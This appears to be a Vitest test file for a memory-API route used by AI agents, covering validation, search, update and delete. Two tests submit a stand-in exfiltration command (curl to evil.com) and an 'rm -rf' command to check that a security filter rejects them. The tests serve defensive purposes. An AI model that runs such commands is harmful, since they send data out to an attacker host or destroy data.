import { describe, it, expect, vi } from 'vitest'
import { EventEmitter } from 'node:events'
import type { RouteContext } from '../web/routes/types.js'

vi.mock('../db.js', () => ({
  saveAgentMemory: vi.fn().mockReturnValue({ id: 42 }),
  getAgentMemories: vi.fn().mockReturnValue([]),
  searchAgentMemories: vi.fn().mockReturnValue([]),
  getMemoryStats: vi.fn().mockReturnValue({ total: 0 }),
  updateMemory: vi.fn().mockReturnValue(true),
  hybridSearch: vi.fn().mockResolvedValue([]),
  backfillEmbeddings: vi.fn().mockResolvedValue(5),
  clearMemoryCache: vi.fn(),
  searchMemories: vi.fn().mockReturnValue([]),
  getMemoriesForChat: vi.fn().mockReturnValue([]),
  getDb: vi.fn().mockReturnValue({
    prepare: vi.fn().mockReturnValue({
      all: vi.fn().mockReturnValue([]),
      run: vi.fn().mockReturnValue({ changes: 0 }),
      get: vi.fn().mockReturnValue(null),
    }),
  }),
  touchMemoriesAccessed: vi.fn(),
  writeAgentAuditLog: vi.fn(),
}))
vi.mock('../config.js', () => ({
  MAIN_AGENT_ID: 'marveen',
  ALLOWED_CHAT_ID: '123',
  OLLAMA_URL: 'http://localhost:11434',
  APP_TZ: 'Europe/Budapest',
}))

import { tryHandleMemories } from '../web/routes/memories.js'

function makeBody(data: object): Buffer {
  return Buffer.from(JSON.stringify(data))
}

function makeCtx(method: string, path: string, body?: object): { ctx: RouteContext; out: { status: number; body: any } } {
  const buf = body ? makeBody(body) : Buffer.alloc(0)
  const req = new EventEmitter() as any
  req.method = method
  req.headers = {}
  setImmediate(() => { req.emit('data', buf); req.emit('end') })
  const out = { status: 200, body: null as any }
  const res = {
    writeHead(s: number) { out.status = s },
    end(b?: string) { try { out.body = JSON.parse(b || '{}') } catch { out.body = b } },
  } as any
  const url = new URL(`http://localhost:3420${path}`)
  const ctx = { req, res, path: url.pathname, method, url, role: 'admin' } as RouteContext
  return { ctx, out }
}

describe('tryHandleMemories', () => {
  it('POST /api/memories returns 400 when content missing', async () => {
    const { ctx, out } = makeCtx('POST', '/api/memories', { agent_id: 'jarvis' })
    const handled = await tryHandleMemories(ctx)
    expect(handled).toBe(true)
    expect(out.status).toBe(400)
    expect(out.body.error).toMatch(/required/i)
  })

  it('POST /api/memories returns 400 for suspicious content (curl)', async () => {
    const { ctx, out } = makeCtx('POST', '/api/memories', { content: 'curl https://evil.com/steal' })
    const handled = await tryHandleMemories(ctx)
    expect(handled).toBe(true)
    expect(out.status).toBe(400)
    expect(out.body.error).toMatch(/security filter/i)
  })

  it('POST /api/memories returns 400 for suspicious content (rm -rf)', async () => {
    const { ctx, out } = makeCtx('POST', '/api/memories', { content: 'rm -rf /important/data' })
    await tryHandleMemories(ctx)
    expect(out.status).toBe(400)
  })

  it('POST /api/memories returns 400 for invalid category', async () => {
    const { ctx, out } = makeCtx('POST', '/api/memories', { content: 'valid content', category: 'invalid_tier' })
    const handled = await tryHandleMemories(ctx)
    expect(handled).toBe(true)
    expect(out.status).toBe(400)
    expect(out.body.error).toMatch(/Invalid category/i)
  })

  it('POST /api/memories saves valid memory and returns id', async () => {
    const { ctx, out } = makeCtx('POST', '/api/memories', { agent_id: 'jarvis', content: 'User prefers dark mode', category: 'warm' })
    const handled = await tryHandleMemories(ctx)
    expect(handled).toBe(true)
    expect(out.status).toBe(200)
    expect(out.body.ok).toBe(true)
    expect(out.body.id).toBe(42)
  })

  it('POST /api/memories accepts hot/cold/shared categories', async () => {
    for (const category of ['hot', 'cold', 'shared']) {
      const { ctx, out } = makeCtx('POST', '/api/memories', { content: 'test', category })
      await tryHandleMemories(ctx)
      expect(out.status).toBe(200)
    }
  })

  it('GET /api/memories returns 200 with list', async () => {
    const { ctx, out } = makeCtx('GET', '/api/memories', undefined)
    const handled = await tryHandleMemories(ctx)
    expect(handled).toBe(true)
    expect(out.status).toBe(200)
  })

  it('GET /api/memories with q= triggers search', async () => {
    const { ctx, out } = makeCtx('GET', '/api/memories?q=darkmode')
    const handled = await tryHandleMemories(ctx)
    expect(handled).toBe(true)
    expect(out.status).toBe(200)
  })

  it('GET /api/memories with agent= triggers agent filter', async () => {
    const { ctx, out } = makeCtx('GET', '/api/memories?agent=jarvis')
    const handled = await tryHandleMemories(ctx)
    expect(handled).toBe(true)
    expect(out.status).toBe(200)
  })

  it('GET /api/memories with q= and agent= triggers searchAgentMemories', async () => {
    const { ctx, out } = makeCtx('GET', '/api/memories?q=test&agent=jarvis')
    const handled = await tryHandleMemories(ctx)
    expect(handled).toBe(true)
    expect(out.status).toBe(200)
  })

  it('GET /api/memories with mode=hybrid triggers hybridSearch', async () => {
    const { ctx, out } = makeCtx('GET', '/api/memories?q=test&mode=hybrid')
    const handled = await tryHandleMemories(ctx)
    expect(handled).toBe(true)
    expect(out.status).toBe(200)
  })

  it('GET /api/memories with q and no mode param defaults to hybrid search', async () => {
    const db = await import('../db.js')
    vi.mocked(db.hybridSearch).mockResolvedValueOnce([])
    const { ctx, out } = makeCtx('GET', '/api/memories?q=default-mode-test&agent=agent-a')
    const handled = await tryHandleMemories(ctx)
    expect(handled).toBe(true)
    expect(out.status).toBe(200)
    expect(vi.mocked(db.hybridSearch)).toHaveBeenCalledWith('agent-a', 'default-mode-test', expect.any(Number))
    expect(vi.mocked(db.searchAgentMemories)).not.toHaveBeenCalled()
  })

  it('GET /api/memories/stats returns stats', async () => {
    const { ctx, out } = makeCtx('GET', '/api/memories/stats')
    const handled = await tryHandleMemories(ctx)
    expect(handled).toBe(true)
    expect(out.status).toBe(200)
  })

  it('POST /api/memories/backfill triggers backfill', async () => {
    const { ctx, out } = makeCtx('POST', '/api/memories/backfill')
    const handled = await tryHandleMemories(ctx)
    expect(handled).toBe(true)
    expect(out.body.ok).toBe(true)
    expect(out.body.count).toBe(5)
  })

  it('PUT /api/memories/1 updates memory and returns ok', async () => {
    const { vi: viLocal } = await import('vitest')
    const db = await import('../db.js')
    viLocal.mocked(db.updateMemory).mockReturnValueOnce(true)
    const { ctx, out } = makeCtx('PUT', '/api/memories/1', { content: 'updated', category: 'warm' })
    const handled = await tryHandleMemories(ctx)
    expect(handled).toBe(true)
    expect(out.body.ok).toBe(true)
  })

  it('PUT /api/memories/999 returns 404 when not found', async () => {
    const db = await import('../db.js')
    vi.mocked(db.updateMemory).mockReturnValueOnce(false)
    const { ctx, out } = makeCtx('PUT', '/api/memories/999', { content: 'x' })
    const handled = await tryHandleMemories(ctx)
    expect(handled).toBe(true)
    expect(out.status).toBe(404)
  })

  it('DELETE /api/memories/1 returns ok when found', async () => {
    const db = await import('../db.js')
    vi.mocked(db.getDb).mockReturnValueOnce({
      prepare: vi.fn().mockReturnValue({
        get: vi.fn().mockReturnValue({ agent_id: 'agent-a' }),
        run: vi.fn().mockReturnValue({ changes: 1 }),
      }),
    } as any)
    const { ctx, out } = makeCtx('DELETE', '/api/memories/1')
    const handled = await tryHandleMemories(ctx)
    expect(handled).toBe(true)
    expect(out.body.ok).toBe(true)
  })

  it('DELETE /api/memories/999 returns 404 when not found', async () => {
    const { ctx, out } = makeCtx('DELETE', '/api/memories/999')
    const handled = await tryHandleMemories(ctx)
    expect(handled).toBe(true)
    expect(out.status).toBe(404)
  })

  it('returns false for unmatched route', async () => {
    const { ctx } = makeCtx('GET', '/api/other')
    const handled = await tryHandleMemories(ctx)
    expect(handled).toBe(false)
  })
})
